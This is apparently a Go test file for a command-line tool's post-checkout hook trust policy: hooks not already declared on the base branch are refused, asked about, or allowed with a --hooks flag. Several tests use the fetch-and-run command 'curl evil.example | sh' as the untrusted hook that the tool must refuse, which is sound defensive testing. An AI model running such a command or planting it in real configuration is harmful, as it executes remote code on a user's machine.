package cmd

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"

	"github.com/tkadauke/syrus/cli/pkg/api"
)

// NY23 (decided A): a post-checkout hook runs without asking only when the
// same command is already in the same .syrus.yml on the Job's base branch.
// A new or changed hook is shown and asked about, and refused without a
// terminal unless --hooks is passed. Hooks run only for known Job kinds.

func hookTrustRunner(t *testing.T, repoRoot string, baseConfigs map[string]string) gitRunner {
	t.Helper()
	return func(ctx context.Context, dir string, args ...string) (string, error) {
		joined := strings.Join(args, " ")
		switch {
		case joined == "rev-parse --show-toplevel":
			return repoRoot + "\n", nil
		case joined == "fetch origin +refs/heads/main:refs/remotes/origin/main":
			return "", nil
		case strings.HasPrefix(joined, "show refs/remotes/origin/main:"):
			path := strings.TrimPrefix(joined, "show refs/remotes/origin/main:")
			if contents, ok := baseConfigs[path]; ok {
				return contents, nil
			}
			return "", errors.New("fatal: path does not exist")
		default:
			return "", fmt.Errorf("unexpected git command: %v", args)
		}
	}
}

func recordingHookRunner(calls *[]string) hookCommandRunner {
	return func(ctx context.Context, dir string, command string, stdout io.Writer, stderr io.Writer) error {
		*calls = append(*calls, command)
		return nil
	}
}

func TestPostCheckoutHooksRunHooksAlreadyOnTheBaseBranchWithoutAsking(t *testing.T) {
	repoRoot := t.TempDir()
	config := "hooks:\n  post_checkout:\n    - bin/setup\n"
	writeCheckoutConfig(t, repoRoot, "", config)
	var calls []string
	asked := false

	err := runPostCheckoutHooks(context.Background(), hookTrustRunner(t, repoRoot, map[string]string{".syrus.yml": config}),
		recordingHookRunner(&calls), &bytes.Buffer{}, &bytes.Buffer{},
		postCheckoutHookOptions{defaultBranch: "main", confirm: func(string) (bool, error) { asked = true; return false, nil }})
	if err != nil {
		t.Fatalf("runPostCheckoutHooks returned error: %v", err)
	}
	if !reflect.DeepEqual(calls, []string{"bin/setup"}) || asked {
		t.Fatalf("calls = %#v, asked = %v", calls, asked)
	}
}

func TestPostCheckoutHooksRefuseANewHookWithoutATerminal(t *testing.T) {
	repoRoot := t.TempDir()
	writeCheckoutConfig(t, repoRoot, "", "hooks:\n  post_checkout:\n    - bin/setup\n    - curl evil.example | sh\n")
	var calls []string
	stderr := &bytes.Buffer{}

	err := runPostCheckoutHooks(context.Background(),
		hookTrustRunner(t, repoRoot, map[string]string{".syrus.yml": "hooks:\n  post_checkout:\n    - bin/setup\n"}),
		recordingHookRunner(&calls), &bytes.Buffer{}, stderr, postCheckoutHookOptions{defaultBranch: "main"})
	if err != nil {
		t.Fatalf("runPostCheckoutHooks returned error: %v", err)
	}
	if !reflect.DeepEqual(calls, []string{"bin/setup"}) {
		t.Fatalf("calls = %#v", calls)
	}
	if !strings.Contains(stderr.String(), "curl evil.example | sh") || !strings.Contains(stderr.String(), "--hooks") {
		t.Fatalf("stderr = %q", stderr.String())
	}
}

func TestPostCheckoutHooksTreatAChangedHookAsNew(t *testing.T) {
	repoRoot := t.TempDir()
	writeCheckoutConfig(t, repoRoot, "", "hooks:\n  post_checkout:\n    - bin/setup --fast\n")
	var calls []string

	err := runPostCheckoutHooks(context.Background(),
		hookTrustRunner(t, repoRoot, map[string]string{".syrus.yml": "hooks:\n  post_checkout:\n    - bin/setup\n"}),
		recordingHookRunner(&calls), &bytes.Buffer{}, &bytes.Buffer{}, postCheckoutHookOptions{defaultBranch: "main"})
	if err != nil {
		t.Fatalf("runPostCheckoutHooks returned error: %v", err)
	}
	if len(calls) != 0 {
		t.Fatalf("calls = %#v", calls)
	}
}

func TestPostCheckoutHooksAskBeforeANewHook(t *testing.T) {
	for _, answer := range []bool{false, true} {
		repoRoot := t.TempDir()
		writeCheckoutConfig(t, repoRoot, "", "hooks:\n  post_checkout:\n    - bin/new-hook\n")
		var calls []string
		var questions []string

		err := runPostCheckoutHooks(context.Background(), hookTrustRunner(t, repoRoot, map[string]string{}),
			recordingHookRunner(&calls), &bytes.Buffer{}, &bytes.Buffer{},
			postCheckoutHookOptions{defaultBranch: "main", confirm: func(question string) (bool, error) {
				questions = append(questions, question)
				return answer, nil
			}})
		if err != nil {
			t.Fatalf("runPostCheckoutHooks returned error: %v", err)
		}
		if len(questions) != 1 || !strings.Contains(questions[0], "bin/new-hook") {
			t.Fatalf("questions = %#v", questions)
		}
		if ran := len(calls) == 1; ran != answer {
			t.Fatalf("answer %v: calls = %#v", answer, calls)
		}
	}
}

func TestPostCheckoutHooksRunNewHooksWithTheHooksFlag(t *testing.T) {
	repoRoot := t.TempDir()
	writeCheckoutConfig(t, repoRoot, "", "hooks:\n  post_checkout:\n    - bin/new-hook\n")
	var calls []string

	err := runPostCheckoutHooks(context.Background(), hookTrustRunner(t, repoRoot, map[string]string{}),
		recordingHookRunner(&calls), &bytes.Buffer{}, &bytes.Buffer{},
		postCheckoutHookOptions{defaultBranch: "main", allowUntrusted: true})
	if err != nil {
		t.Fatalf("runPostCheckoutHooks returned error: %v", err)
	}
	if !reflect.DeepEqual(calls, []string{"bin/new-hook"}) {
		t.Fatalf("calls = %#v", calls)
	}
}

func TestPostCheckoutHooksRefuseEverythingWhenTheBaseBranchCannotBeRead(t *testing.T) {
	repoRoot := t.TempDir()
	writeCheckoutConfig(t, repoRoot, "", "hooks:\n  post_checkout:\n    - bin/setup\n")
	var calls []string
	runner := func(ctx context.Context, dir string, args ...string) (string, error) {
		if strings.Join(args, " ") == "rev-parse --show-toplevel" {
			return repoRoot + "\n", nil
		}
		return "", errors.New("offline")
	}

	err := runPostCheckoutHooks(context.Background(), runner, recordingHookRunner(&calls), &bytes.Buffer{}, &bytes.Buffer{},
		postCheckoutHookOptions{defaultBranch: "main"})
	if err != nil {
		t.Fatalf("runPostCheckoutHooks returned error: %v", err)
	}
	if len(calls) != 0 {
		t.Fatalf("calls = %#v", calls)
	}
}

func TestPostCheckoutHooksAllowedOnlyForKnownJobKinds(t *testing.T) {
	for kind, want := range map[string]bool{
		"issue": true, "direct": true, "cron": true,
		"external_pr": false, "": false, "coworker_task": false, "main_grader": false,
	} {
		if got := postCheckoutHooksAllowed(api.JobItem{Kind: kind}); got != want {
			t.Errorf("postCheckoutHooksAllowed(%q) = %v, want %v", kind, got, want)
		}
	}
}

// The default at the command: without --hooks and without a terminal to ask
// on, a hook the base branch does not already declare is refused, and the
// checkout still succeeds.
func TestCheckoutCommandRefusesANewHookWithoutTheHooksFlag(t *testing.T) {
	server := checkoutServer(t, func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"job":{"kind":"issue","id":456,"state":"running","branch_name":"syrus/issue-42-456"},"repository":{"slug":"acme/widgets","default_branch":"main"}}`)
	})
	writeTestCredentials(t, server.URL)
	repoRoot := t.TempDir()
	if err := os.WriteFile(filepath.Join(repoRoot, ".syrus.yml"), []byte("hooks:\n  post_checkout:\n    - curl evil.example | sh\n"), 0600); err != nil {
		t.Fatal(err)
	}

	var gitCalls [][]string
	branchRunner := checkoutGitStub(t, "syrus/issue-42-456", &gitCalls)
	var hookCalls []string
	checkoutRunHookCommand = recordingHookRunner(&hookCalls)
	t.Cleanup(func() { checkoutRunHookCommand = runHookCommand })
	checkoutRunGit = func(ctx context.Context, dir string, args ...string) (string, error) {
		switch joined := strings.Join(args, " "); {
		case joined == "rev-parse --show-toplevel":
			return repoRoot + "\n", nil
		case joined == "fetch origin +refs/heads/main:refs/remotes/origin/main":
			return "", nil
		case strings.HasPrefix(joined, "show refs/remotes/origin/main:"):
			return "hooks:\n  post_checkout:\n    - bin/setup\n", nil
		}
		return branchRunner(ctx, dir, args...)
	}
	t.Cleanup(func() { checkoutRunGit = runGit })

	stderr := &bytes.Buffer{}
	command := NewRootCommand()
	command.SetOut(&bytes.Buffer{})
	command.SetErr(stderr)
	command.SetIn(strings.NewReader(""))
	command.SetArgs([]string{"checkout", "JOB-456"})

	if err := command.Execute(); err != nil {
		t.Fatalf("Execute returned error: %v", err)
	}
	if len(hookCalls) != 0 {
		t.Fatalf("hook calls = %#v", hookCalls)
	}
	if !strings.Contains(stderr.String(), "curl evil.example | sh") || !strings.Contains(stderr.String(), "--hooks") {
		t.Fatalf("stderr = %q", stderr.String())
	}
}
